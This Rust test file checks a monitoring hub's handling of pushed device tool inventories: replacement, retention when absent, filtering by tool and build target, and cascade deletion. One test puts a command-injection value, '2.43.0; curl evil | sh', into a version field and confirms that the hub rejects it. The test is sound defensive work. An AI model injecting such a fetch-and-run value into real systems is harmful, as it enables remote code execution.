//! CAP-020 to CAP-031 through the hub's routes: a pushed batch's `inventory` replaces the
//! device's tool inventory, its absence (an older agent) leaves it, and `capabilities` lists it
//! to a read key, filtered by tool and build target.

use axum::http::StatusCode;
use chrono::{DateTime, TimeDelta, Utc};
use serde_json::{Value, json};
use sqlx::PgPool;

use crate::agent::{
    batches::cpu_batch,
    harness::{Agents, DOCKER_HOST, PVE_01, pushing_now},
};

const CAPABILITIES: &str = "query($tool: String, $buildTarget: String) {
    capabilities(tool: $tool, buildTarget: $buildTarget) {
        device { id name } architecture os osVersion
        tools { name version usable reason } buildTargets foundAt } }";

const CREATE_KEY: &str =
    "mutation($input: ApiKeyInput!) { createApiKey(input: $input) { secret } }";

/// A batch of `device` at `at` with one CPU point, and `inventory` when given.
fn inventory_batch(device: &str, at: DateTime<Utc>, inventory: Option<Value>) -> Value {
    let mut pushed = cpu_batch(device, at, 5.0);
    if let Some(inventory) = inventory {
        pushed["inventory"] = inventory;
    }
    pushed
}

fn linux(tools: Value, targets: Value) -> Value {
    let mut inventory = json!({ "architecture": "x86_64", "os": "linux", "osVersion": "24.04" });
    inventory["tools"] = tools;
    inventory["buildTargets"] = targets;
    inventory
}

/// A read key's secret, made by the signed-in operator.
async fn read_key(agents: &Agents, now: DateTime<Utc>) -> String {
    let input = json!({ "name": "inventory reader", "scope": "READ", "madeFor": "AGENT",
                        "expiresAt": now + TimeDelta::days(30) });
    let made = agents.operate(CREATE_KEY, json!({ "input": input })).await;
    made["data"]["createApiKey"]["secret"]
        .as_str()
        .unwrap_or_else(|| panic!("{made}"))
        .to_owned()
}

async fn listed(agents: &Agents, key: &str, filter: Value) -> Vec<Value> {
    let answer = agents.graphql(Some(key), CAPABILITIES, filter).await;
    answer["data"]["capabilities"]
        .as_array()
        .unwrap_or_else(|| panic!("{answer}"))
        .clone()
}

fn names(rows: &[Value]) -> Vec<&str> {
    rows.iter()
        .map(|row| row["device"]["name"].as_str().unwrap_or_default())
        .collect()
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_029_a_pushed_inventory_replaces_the_stored_one_and_an_older_agent_keeps_it(
    pool: PgPool,
) {
    let now = pushing_now(&pool).await;
    let agents = Agents::at(&pool, now).await;
    let token = agents.token_for(PVE_01).await;
    let key = read_key(&agents, now).await;
    let at = |step: i64| now - TimeDelta::seconds(40 - 10 * step);

    let older_agent = inventory_batch(PVE_01, at(0), None);
    assert_eq!(
        agents.push(&token, &older_agent).await.0,
        StatusCode::NO_CONTENT
    );
    assert_eq!(listed(&agents, &key, json!({})).await, Vec::<Value>::new());

    let tools = json!([
        { "name": "rustc", "version": "1.91.0" },
        { "name": "git", "version": "2.43.0" },
        { "name": "bun", "state": "timed_out" },
        { "name": "cargo", "state": "exited" },
        { "name": "node", "state": "no_version" },
        { "name": "docker", "state": "denied" },
        { "name": "zig", "version": "0.15.1" }
    ]);
    let first = linux(
        tools,
        json!(["x86_64-unknown-linux-gnu", "aarch64-unknown-linux-gnu"]),
    );
    let pushed = inventory_batch(PVE_01, at(1), Some(first));
    assert_eq!(agents.push(&token, &pushed).await.0, StatusCode::NO_CONTENT);
    let rows = listed(&agents, &key, json!({})).await;
    assert_eq!(
        rows,
        [json!({
            "device": { "id": PVE_01, "name": "pve-01" },
            "architecture": "x86_64", "os": "linux", "osVersion": "24.04",
            "tools": [
                { "name": "git", "version": "2.43.0", "usable": true, "reason": null },
                { "name": "rustc", "version": "1.91.0", "usable": true, "reason": null },
                { "name": "cargo", "version": null, "usable": false, "reason": "EXITED" },
                { "name": "bun", "version": null, "usable": false, "reason": "TIMED_OUT" },
                { "name": "node", "version": null, "usable": false, "reason": "NO_VERSION" },
                { "name": "docker", "version": null, "usable": false, "reason": "FAILED" }
            ],
            "buildTargets": ["aarch64-unknown-linux-gnu", "x86_64-unknown-linux-gnu"],
            "foundAt": rows[0]["foundAt"],
        })],
        "zig is a tool this hub does not know: dropped; a reason it does not know is FAILED"
    );

    let unchanged = inventory_batch(PVE_01, at(2), None);
    assert_eq!(
        agents.push(&token, &unchanged).await.0,
        StatusCode::NO_CONTENT
    );
    assert_eq!(
        listed(&agents, &key, json!({})).await,
        rows,
        "absent means unchanged"
    );

    let cleared = inventory_batch(PVE_01, at(3), Some(linux(json!([]), json!([]))));
    assert_eq!(
        agents.push(&token, &cleared).await.0,
        StatusCode::NO_CONTENT
    );
    let rows = listed(&agents, &key, json!({})).await;
    assert_eq!(
        (&rows[0]["tools"], &rows[0]["buildTargets"]),
        (&json!([]), &json!([]))
    );
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_030_capabilities_filter_by_usable_tool_and_by_build_target(pool: PgPool) {
    let now = pushing_now(&pool).await;
    let agents = Agents::at(&pool, now).await;
    let key = read_key(&agents, now).await;
    let at = now - TimeDelta::seconds(10);
    let pve = linux(
        json!([{ "name": "cargo", "version": "1.91.0" }, { "name": "docker", "state": "failed" }]),
        json!(["x86_64-unknown-linux-gnu"]),
    );
    let docker_host = linux(
        json!([{ "name": "docker", "version": "29.0.1" }]),
        json!(["wasm32-unknown-unknown", "x86_64-unknown-linux-gnu"]),
    );
    for (device, inventory) in [(PVE_01, pve), (DOCKER_HOST, docker_host)] {
        let token = agents.token_for(device).await;
        let pushed = inventory_batch(device, at, Some(inventory));
        assert_eq!(agents.push(&token, &pushed).await.0, StatusCode::NO_CONTENT);
    }

    let every = listed(&agents, &key, json!({})).await;
    assert_eq!(names(&every), ["docker-host", "pve-01"], "by device name");
    let docker = listed(&agents, &key, json!({ "tool": "docker" })).await;
    assert_eq!(
        names(&docker),
        ["docker-host"],
        "a failed docker is not usable"
    );
    let wasm = listed(
        &agents,
        &key,
        json!({ "buildTarget": "wasm32-unknown-unknown" }),
    )
    .await;
    assert_eq!(names(&wasm), ["docker-host"]);
    let both = json!({ "tool": "cargo", "buildTarget": "x86_64-unknown-linux-gnu" });
    assert_eq!(names(&listed(&agents, &key, both).await), ["pve-01"]);
    let neither = json!({ "tool": "cargo", "buildTarget": "wasm32-unknown-unknown" });
    assert_eq!(listed(&agents, &key, neither).await, Vec::<Value>::new());
    let unknown = listed(&agents, &key, json!({ "tool": "zig" })).await;
    assert_eq!(unknown, Vec::<Value>::new());
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_029_an_inventory_that_breaks_k8_is_malformed_and_stores_nothing(pool: PgPool) {
    let now = pushing_now(&pool).await;
    let agents = Agents::at(&pool, now).await;
    let token = agents.token_for(PVE_01).await;
    let hostile = linux(
        json!([{ "name": "git", "version": "2.43.0; curl evil | sh" }]),
        json!([]),
    );
    let pushed = inventory_batch(PVE_01, now - TimeDelta::seconds(10), Some(hostile));
    assert_eq!(
        agents.push(&token, &pushed).await.0,
        StatusCode::BAD_REQUEST
    );
    let stored: i64 = sqlx::query_scalar("SELECT count(*) FROM metrics.inventories")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored, 0);
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_020_a_deleted_device_takes_its_inventory_with_it(pool: PgPool) {
    let now = pushing_now(&pool).await;
    let agents = Agents::at(&pool, now).await;
    let token = agents.token_for(PVE_01).await;
    let inventory = linux(
        json!([{ "name": "git", "version": "2.43.0" }]),
        json!(["x"]),
    );
    let pushed = inventory_batch(PVE_01, now - TimeDelta::seconds(10), Some(inventory));
    assert_eq!(agents.push(&token, &pushed).await.0, StatusCode::NO_CONTENT);
    sqlx::query("DELETE FROM devices.devices WHERE id = $1::uuid")
        .bind(PVE_01)
        .execute(&pool)
        .await
        .unwrap();
    for table in ["inventories", "tools", "build_targets"] {
        let left: i64 = sqlx::query_scalar(&format!("SELECT count(*) FROM metrics.{table}"))
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(left, 0, "{table}");
    }
}
